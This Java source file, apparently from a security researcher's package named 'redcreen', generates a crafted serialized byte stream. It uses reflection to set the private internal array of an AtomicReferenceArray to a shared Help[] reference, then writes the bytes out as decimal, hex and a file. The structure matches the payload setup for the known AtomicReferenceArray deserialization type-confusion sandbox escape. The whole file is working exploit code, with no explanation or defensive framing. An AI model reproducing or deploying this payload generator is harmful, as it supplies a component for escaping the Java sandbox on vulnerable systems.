package redcreen;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicReferenceArray;

class Help implements Serializable{
	public static final long serialVersionUID = 1L;
}
public class HelpByteGenerator {

	public static void main(String[] args) throws Exception {
		Help[] helparr = new Help[] { null };

		AtomicReferenceArray<Help[]> arr = new AtomicReferenceArray<Help[]>(0);
		Field filed1 = arr.getClass().getDeclaredField("array");
		filed1.setAccessible(true);
		filed1.set(arr, helparr);
		Object[] objarr = new Object[] { helparr, arr };

		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(bos);
		oos.writeObject(objarr);
		
		byte[]  buf = bos.toByteArray();
		
		System.out.println(Arrays.toString(buf));
		
		StringBuffer sb = new StringBuffer();
		for (int i = 0 ; i < buf.length; i++){
			if (i != 0) {
				sb.append(" ");
			}
			int ai = buf[i] & 0xFF;
			String as = Integer.toHexString(ai);
			if (as.length() < 2) {
				sb.append("0");
				
			}
			sb.append(as.toUpperCase());
		}
		System.out.println(sb);

		FileOutputStream fos = new FileOutputStream("test.out");
		fos.write(buf);
		fos.close();
	}

}